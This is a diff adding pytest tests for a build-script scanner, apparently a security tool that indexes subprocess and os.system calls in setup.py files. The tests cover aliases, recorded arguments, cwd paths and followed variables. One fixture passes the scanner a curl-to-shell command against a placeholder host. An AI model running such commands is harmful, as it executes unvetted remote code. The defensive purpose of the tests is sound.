@@ -277,6 +277,181 @@ def test_a_handed_function_carries_the_call_it_went_to() -> None:
     assert scan.calls_out == () and scan.handed_out == (("memos.work.go", "functools.partial"),)
 
 
+def test_build_script_calls_carry_their_arguments() -> None:
+    from garnet_guard.facts.pyindex import index_build_script, sensitive_calls
+    from garnet_guard.models import ARGS_TEXT_LIMIT
+
+    src = (
+        "import subprocess as sp\n"
+        "sp.call(['make', 'docs'], cwd='d', shell=False)\n"
+        "sp.call([\"make\",\n   u'docs'],  shell=False, cwd='d')  # same call\n"
+        "sp.call(('make', 'docs'), cwd='d', shell=False)\n"
+        "sp.call(cmd, **extra)\n"
+        f"sp.call('{'y' * 2000}')\n"
+    )
+    calls = index_build_script(src.encode())
+    assert [c.args for c in calls[:4]] == [
+        "(['make', 'docs'], cwd='d', shell=False)",
+        "(['make', 'docs'], cwd='d', shell=False)",
+        "(('make', 'docs'), cwd='d', shell=False)",
+        "(cmd, **extra)",
+    ]
+    keys = [c.args_key for c in calls]
+    assert keys[0] == keys[1] and len(set(keys)) == 4
+    long = calls[4].args
+    assert long is not None and len(long) == ARGS_TEXT_LIMIT and long.endswith("…")
+    # Only build scripts record arguments; the other rules compare names.
+    assert {(c.args, c.args_key) for c in sensitive_calls(src.encode())} == {(None, None)}
+
+
+def test_build_script_calls_through_an_alias_are_the_calls_they_name() -> None:
+    """``run = subprocess.call; run([...])`` in setup.py is a subprocess.call:
+    the rule page says calls resolve through simple aliasing, and the module
+    index did, but the build-script index compared the alias's name."""
+    from garnet_guard.facts.pyindex import index_build_script, sensitive_calls
+
+    src = (
+        "import subprocess, os\n"
+        "run = subprocess.call\n"
+        "sp = subprocess\n"
+        "sh = os.system\n"
+        "run(['sh', '-c', 'curl https://x.invalid | sh'])\n"
+        "sp.check_call(['make'])\n"
+        "def build():\n"
+        "    sh('make docs')\n"
+    )
+    calls = index_build_script(src.encode())
+    assert [(c.name, c.line, c.via) for c in calls] == [
+        ("subprocess.call", 5, None),
+        ("subprocess.check_call", 6, None),
+        ("os.system", 8, "build"),
+    ]
+    assert calls[0].args == "(['sh', '-c', 'curl https://x.invalid | sh'])"
+    # The alias counts from where it is assigned, not before, and a name the
+    # file defines isn't an alias even when a module has that name.
+    late = "import subprocess\nrun(['x'])\nrun = subprocess.call\n"
+    assert [c.line for c in index_build_script(late.encode())] == []
+    shadow = "import subprocess\ndef call(cmd):\n    return cmd\ncall(['x'])\n"
+    assert index_build_script(shadow.encode()) == ()
+    # The module index (GRN-C012's names) resolves the same way.
+    assert {c.name for c in sensitive_calls(src.encode())} == {
+        "subprocess.call",
+        "subprocess.check_call",
+        "os.system",
+    }
+
+
+def test_build_script_calls_record_the_paths_their_strings_may_name() -> None:
+    from garnet_guard.facts.pyindex import MENTION_LIMIT, index_build_script
+
+    src = (
+        "import subprocess, os\n"
+        "cmd = ['sh', './scripts/build.sh', '-v']\n"
+        "subprocess.call(cmd, cwd='docs')\n"
+        "os.system('make -C docs html; /usr/bin/env python ./gen.py')\n"
+        f"os.system('{'x' * (MENTION_LIMIT + 1)}' + 'y')\n"
+    )
+    call, system, long = index_build_script(src.encode())
+    assert long.mentions == ("y",)
+    assert call.mentions == ("docs/-v", "docs/scripts/build.sh", "docs/sh")
+    assert system.mentions == (
+        "-C",
+        "GNUmakefile",
+        "Makefile",
+        "docs",
+        "gen.py",
+        "html;",
+        "make",
+        "make -C docs html; /usr/bin/env python ./gen.py",
+        "makefile",
+        "python",
+    )
+
+
+def test_a_build_script_calls_cwd_says_where_its_paths_are() -> None:
+    """A ``cwd`` written out, or held by a variable the index follows, goes in
+    front of each path; a ``cwd`` that can't be read, or is absolute, leaves
+    no path to look up, since the files aren't where a name alone says."""
+    from garnet_guard.facts.pyindex import index_build_script
+
+    def mentions(line: str) -> tuple[str, ...]:
+        src = "import subprocess, os\nwhere = 'vendor/libuv'\n" + line + "\n"
+        [c] = index_build_script(src.encode())
+        return c.mentions
+
+    under = (
+        "vendor/libuv/GNUmakefile",
+        "vendor/libuv/Makefile",
+        "vendor/libuv/make",
+        "vendor/libuv/makefile",
+    )
+    root = ("GNUmakefile", "Makefile", "make", "makefile")
+    assert mentions("subprocess.run(['make'], cwd='vendor/libuv/')") == under
+    assert mentions("subprocess.run(['make'], cwd='./vendor/libuv')") == under
+    assert mentions("subprocess.run(['make'], cwd=where)") == under
+    assert mentions("subprocess.run(['make'], cwd='.')") == root
+    assert mentions("subprocess.run(['make'], cwd=None)") == root
+    assert mentions("subprocess.run(['make'], cwd=os.path.dirname(__file__))") == ()
+    assert mentions("subprocess.run(['make'], cwd='/tmp')") == ()
+    assert mentions("subprocess.run(['make'], cwd=where + '/x')") == ()
+
+
+def test_build_script_variables_are_read_as_the_literal_they_hold() -> None:
+    """A variable bound once, to a value written out in full, that nothing else
+    touches, is keyed as that value and shown beside the call."""
+    from garnet_guard.facts.pyindex import index_build_script
+
+    def one(src: str) -> tuple[str | None, str | None]:
+        [c] = [c for c in index_build_script(src.encode()) if c.name != "os.system"]
+        return c.args, c.args_key
+
+    plain = one("import subprocess\nsubprocess.call(['make', 'docs'], cwd='d')\n")
+    held = one("import subprocess\ncmd = ['make', 'docs']\nsubprocess.call(cmd, cwd='d')\n")
+    assert held[0] == "(cmd, cwd='d') with cmd = ['make', 'docs']"
+    assert held[1] == plain[1]
+    # Keyword values, ``**`` mappings and immutable values are followed too,
+    # from an enclosing scope, with each name shown once.
+    src = (
+        "import subprocess\n"
+        "where = 'docs'\n"
+        "opts = {'shell': False}\n"
+        "def build():\n"
+        "    cmd = ('make', '-j')\n"
+        "    subprocess.call(cmd, cmd, cwd=where, **opts)\n"
+    )
+    assert one(src)[0] == (
+        "(cmd, cmd, cwd=where, **opts) with cmd = ('make', '-j') with where = 'docs'"
+        " with opts = {'shell': False}"
+    )
+    # Not followed: a value with a name or a call in it, a name bound twice
+    # or in a loop, a parameter, a name under ``global``, a name an import
+    # binds, and a list or dict read anywhere else, where a method call or
+    # another function may have changed it.
+    for src in (
+        "cmd = ['make', target]\nsubprocess.call(cmd)\n",
+        "cmd = ['make'] + extra\nsubprocess.call(cmd)\n",
+        "cmd = ['make']\ncmd = ['sh']\nsubprocess.call(cmd)\n",
+        "for cmd in (['make'], ['sh']):\n    subprocess.call(cmd)\n",
+        "def run(cmd=['make']):\n    subprocess.call(cmd)\n",
+        "cmd = ['make']\ndef run():\n    global cmd\n    subprocess.call(cmd)\n",
+        "import cmd\nsubprocess.call(cmd)\n",
+        "cmd = ['make']\ncmd.append('docs')\nsubprocess.call(cmd)\n",
+        "cmd = ['make']\nprint(cmd)\nsubprocess.call(cmd)\n",
+        "cmd = ['make']\ndef run():\n    cmd[0] = 'sh'\nsubprocess.call(cmd)\n",
+    ):
+        args, key = one("import subprocess\n" + src)
+        assert args == "(cmd)", src
+        assert key == one("import subprocess\nsubprocess.call(cmd)\n")[1], src
+    # A string read elsewhere can't have been changed, so it is followed.
+    args, _ = one("import subprocess\ncmd = 'make'\nprint(cmd)\nsubprocess.call(cmd)\n")
+    assert args == "(cmd) with cmd = 'make'"
+    # Python reads a function's name from the module, not from a class body.
+    src = "import subprocess\ncmd = 'make'\nclass B:\n    cmd = 'sh'\n    def run(self):\n        subprocess.call(cmd)\n"
+    assert one(src)[0] == "(cmd) with cmd = 'make'"
+    src = "import subprocess\ncmd = 'make'\nclass B:\n    cmd = 'sh'\n    subprocess.call(cmd)\n"
+    assert one(src)[0] == "(cmd) with cmd = 'sh'"
+
+
 def test_sensitive_calls_anywhere_names_the_enclosing_function() -> None:
     from garnet_guard.facts.pyindex import sensitive_calls
 
